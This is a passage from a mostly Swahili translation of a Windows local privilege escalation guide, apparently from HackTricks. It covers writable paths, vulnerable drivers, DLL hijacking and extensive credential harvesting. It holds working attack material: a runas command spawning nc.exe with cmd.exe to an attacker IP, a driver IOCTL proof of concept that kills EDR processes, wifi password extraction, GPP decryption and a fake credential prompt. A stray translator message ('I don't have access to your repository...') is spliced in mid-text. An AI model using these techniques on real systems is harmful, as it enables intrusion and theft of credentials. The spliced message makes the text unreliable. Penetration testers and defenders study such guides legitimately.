accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Endeshwa wakati wa kuanzishwa

**Angalia ikiwa unaweza kuandika juu ya registry au binary zitakazotekelezwa na mtumiaji mwingine.**\
**Soma** **ukurasa ufuatao** ili ujifunze zaidi kuhusu maeneo ya kuvutia ya **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Madereva

Tafuta madereva wa pande za tatu ambayo yanaweza kuwa **ya ajabu au yenye udhaifu**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Iwapo driver inatoa arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), unaweza kupandisha hadhi kwa kuiba SYSTEM token moja kwa moja kutoka kernel memory. Tazama mbinu ya hatua‑kwa‑hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Kwa bugs za race-condition ambapo simu dhaifu hufungua Object Manager path inayodhibitiwa na mshambuliaji, kupunguza kwa makusudi mchakato wa lookup (kutumia max-length components au deep directory chains) kunaweza kupanua dirisha kutoka microseconds hadi miongo kadhaa ya mikrosekunde:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitives za uharibifu wa memory za registry hive

Udhaifu wa kisasa wa hive hukuwezesha kubuni layouts deterministic, kutumia writable descendants za HKLM/HKU, na kubadilisha uharibifu wa metadata kuwa kernel paged-pool overflows bila custom driver. Jifunze mnyororo mzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Kunyanyasa ukosefu wa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya signed third‑party drivers huunda device object yao na SDDL kali kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN katika DeviceCharacteristics. Bila flag hii, secure DACL haitotekelezwa wakati device inafunguliwa kupitia path yenye component ya ziada, ikimruhusu mtumiaji asiye na ruhusa kupata handle kwa kutumia namespace path kama:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Mara mtu anapoweza kufungua device, privileged IOCTLs exposed by the driver zinaweza kutumiwa kwa LPE na tampering. Uwezo za mfano zilizotambuliwa kwa uhalisia:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Kukomesha arbitrary processes, ikiwa ni pamoja na Protected Process/Light (PP/PPL), kuruhusu AV/EDR kill kutoka user land via kernel.

Muundo wa PoC mdogo (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Kupunguza hatari kwa watengenezaji
- Daima weka FILE_DEVICE_SECURE_OPEN unapotengeneza device objects zinazokusudiwa kuzuiwa na DACL.
- Thibitisha muktadha wa caller kwa operesheni zenye ruhusa. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu kusitishwa kwa mchakato au kurudishwa kwa handle.
- Zuia IOCTLs (access masks, METHOD_*, input validation) na zingatia mifumo ya brokered badala ya ruhusa za kernel moja kwa moja.

Mawazo ya utambuzi kwa watetezi
- Fuatilia ufunguzi wa user-mode wa majina ya device yenye shaka (e.g., \\ .\\amsdk*) na mfululizo maalum wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) na udumishe orodha zako za kuruhusu/kukataza.


## PATH DLL Hijacking

Ikiwa una **ruksa za kuandika ndani ya folda iliyopo kwenye PATH** unaweza kuwa na uwezo wa hijack a DLL inayopakiwa na mchakato na **kupandisha ruhusa**.

Kagua ruhusa za folda zote ndani ya PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Mtandao

### Folda zilizoshirikiwa
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Angalia kompyuta nyingine zinazojulikana zilizo hardcoded kwenye hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Violesura vya Mtandao & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Bandari Zilizofunguliwa

Angalia **huduma zilizo na vikwazo** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Njia
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Jedwali
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Sheria za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha sheria, unda sheria, zima, zima...)**

Zaidi [amri za network enumeration hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Faili binari `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ikiwa utapata mtumiaji root unaweza kusikiliza kwenye bandari yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye bandari, itauliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanza bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza filesystem ya `WSL` katika folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Msimamizi wa vitambulisho / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault inahifadhi vitambulisho vya watumiaji kwa seva, tovuti na programu nyingine ambazo **Windows** can **log in the users automaticall**y. Mwanzo, hili linaweza kuonekana kana kwamba watumiaji wanaweza kuhifadhi vitambulisho vyao vya Facebook, Twitter, Gmail n.k., ili waingie kiotomatiki kupitia vivinjari. Lakini si hivyo.

Windows Vault inahifadhi vitambulisho ambavyo Windows inaweza kutumia kuingia kwa niaba ya watumiaji kwa njia ya kiotomatiki, ambayo inamaanisha kwamba programu yoyote ya **Windows application that needs credentials to access a resource** (seva au tovuti) **can make use of this Credential Manager** & Windows Vault na kutumia vitambulisho vilivyotolewa badala ya watumiaji kuingiza jina la mtumiaji na nywila kila wakati.

Iwapo programu hazijaingiliana na Credential Manager, sipatiamini itakuwa inawezekana kwao kutumia vitambulisho kwa rasilimali fulani. Kwa hivyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **communicate with the credential manager and request the credentials for that resource** kutoka kwenye vault ya kuhifadhi ya chaguo-msingi.

Tumia `cmdkey` kuorodhesha vitambulisho vilivyohifadhi kwenye mashine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` kwa chaguo la `/savecred` ili kutumia saved credentials. Mfano ufuatao unaoita remote binary kupitia SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` na seti ya credential iliyotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Kumbuka kwamba mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kutoka kwa [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** inatoa njia ya usimbaji (symmetric encryption) wa data, inayotumika hasa ndani ya mfumo wa uendeshaji Windows kwa usimbaji wa symmetrika wa funguo binafsi zisizolingana (asymmetric private keys). Usimbaji huu unatumia siri ya mtumiaji au ya mfumo ili kuchangia kwa kiasi kikubwa entropy.

**DPAPI inaruhusu usimbaji wa funguo kupitia ufunguo wa symmetrika unaotokana na siri za kuingia za mtumiaji**. Katika mazingira yanayohusisha usimbaji wa mfumo, hutumia siri za uthibitishaji za domain za mfumo.

Funguo za RSA za mtumiaji zilizosimbwa, kwa kutumia DPAPI, zinalowekwa katika %APPDATA%\Microsoft\Protect\{SID} directory, ambapo {SID} inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya mtumiaji. **Ufunguo wa DPAPI, uliopo pamoja na ufunguo mkuu unaolinda funguo binafsi za mtumiaji katika faili ileile**, kwa kawaida una taratibu 64 bytes za data za nasibu. (Ni muhimu kutambua kwamba upatikanaji wa directory hii uko ndani ya vizuizi, ukizuia kuorodhesha yaliyomo kwa kutumia amri dir katika CMD, ingawa yanaweza kuorodheshwa kupitia PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` kwa hoja zinazofaa (`/pvk` au `/rpc`) ili kuifungua.

Faili za **credentials files protected by the master password** kwa kawaida ziko katika:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili kufanya **decrypt**.\
Unaweza **extract many DPAPI** **masterkeys** kutoka **memory** kwa kutumia module `sekurlsa::dpapi` (ikiwa wewe ni root).

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Vyeti za PowerShell

**Vyeti za PowerShell** hutumika mara nyingi kwa ajili ya **scripting** na automation tasks kama njia ya kuhifadhi nyaraka za uthibitisho zilizosimbwa kwa urahisi. Vyeti hivyo zinalindwa kwa kutumia **DPAPI**, ambayo kwa kawaida inamaanisha zinaweza tu kufunguliwa tena na mtumiaji yule yule kwenye kompyuta ile ile walipotengenezwa.

Ili **decrypt** PS credentials kutoka kwenye faili inayohifadhi, unaweza kufanya:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Muunganisho za RDP zilizohifadhiwa

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri zilizotekelezwa hivi karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Meneja wa Cheti za Desktop ya Mbali**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Tumia **Mimikatz** `dpapi::rdg` module pamoja na `/masterkey` inayofaa ili **decrypt any .rdg files**\
Unaweza **extract many DPAPI masterkeys** kutoka kwenye kumbukumbu kwa kutumia Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Watu mara nyingi hutumia app ya StickyNotes kwenye workstations za Windows ili **save passwords** na taarifa nyingine, bila kutambua kuwa ni faili ya database. Faili hii iko kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na daima inastahili kutafutwa na kuchunguzwa.

### AppCmd.exe

**Kumbuka kwamba ili recover passwords kutoka AppCmd.exe unahitaji kuwa Administrator na kuendesha chini ya High Integrity level.**\
**AppCmd.exe** iko katika `%systemroot%\system32\inetsrv\` directory.\
Ikiwa faili hii ipo basi kuna uwezekano kwamba baadhi ya **credentials** zimesanidiwa na zinaweza **recovered**.

Msimbo huu umechukuliwa kutoka kwa [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia ikiwa `C:\Windows\CCM\SCClient.exe` ipo .\
Wasakinishaji **huendeshwa kwa SYSTEM privileges**, nyingi zinaweza kuwa dhaifu kwa **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Faili na Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Funguo za mwenyeji
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys katika rejista

Funguo binafsi za SSH zinaweza kuhifadhiwa ndani ya ufunguo wa rejista `HKCU\Software\OpenSSH\Agent\Keys`, hivyo unapaswa kuangalia kama kuna kitu chochote cha kuvutia ndani yake:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ikiwa utapata kipengee chochote ndani ya njia hiyo, huenda ni SSH key iliyohifadhiwa. Imehifadhiwa kwa muundo uliosimbwa lakini inaweza kufunjuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Taarifa zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze moja kwa moja wakati wa boot, endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda baadhi ya ssh keys, kuziongeza kwa `ssh-add` na kuingia kwa ssh kwenye mashine. Rejista HKCU\Software\OpenSSH\Agent\Keys haipo na procmon haikutambua matumizi ya `dpapi.dll` wakati wa uthibitishaji wa funguo za asymmetric.

### Faili zisizohudumiwa
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Maudhui ya mfano:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM chelezo
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Vyeti vya Wingu
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili inayoitwa **SiteList.xml**

### Nenosiri la GPP lililohifadhiwa

Kuna kipengele kilichopatikana hapo awali kilichowawezesha kupeleka akaunti za msimamizi wa ndani zilizobinafsishwa kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, mbinu hii ilikuwa na mapungufu makubwa ya usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML katika SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa domain. Pili, nywila ndani ya GPP hizi, zilizofichwa kwa kutumia AES256 kwa kutumia ufunguo wa awali ulioandikwa hadharani, zingeweza kufunguliwa na mtumiaji yeyote aliyethibitishwa. Hili liliweka hatari kubwa, kwani lingeweza kumruhusu mtumiaji kupata haki za juu.

Ili kupunguza hatari hii, kazi ilitengenezwa kuchunguza faili za GPP zilizohifadhiwa ndani zilizo na sehemu ya "cpassword" ambayo sio tupu. Kufanikiwa kupata faili kama hiyo, kazi hiyo huifungua nywila na kurudisha PowerShell object maalum. Object hii inajumuisha maelezo kuhusu GPP na eneo la faili, ikiwezesha utambuzi na utatuzi wa tatizo hili la usalama.

Tafuta katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ kwa faili hizi:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Ili kufungua cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata passwords:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Usanidi wa Wavuti
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config na credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Rejista
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Kuomba credentials

Unaweza kila wakati **kuomba user aingize credentials zake au hata credentials za user mwingine** ikiwa unadhani anaweza kuyajua (kumbuka kwamba **kuomba** client moja kwa moja kwa **credentials** ni hatari sana):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina ya faili yanayowezekana yanayojumuisha credentials**

Faili zinazojulikana ambazo hapo awali zilihifadhi **passwords** kwa **clear-text** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your repository. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or attach the file text) and I will translate the relevant English text to Swahili following your rules.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials katika RecycleBin

Pia unapaswa kuangalia Bin kutafuta credentials ndani yake

Ili **recover passwords** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Vifunguo vingine vya registry vinavyowezekana vyenye credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia za Vivinjari

Unapaswa kukagua dbs ambapo nywila za **Chrome au Firefox** zinahifadhiwa.\
Pia angalia historia, alama za ukurasa na vipendwa vya vivinjari kwani labda baadhi ya nywila zimehifadhiwa hapo.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

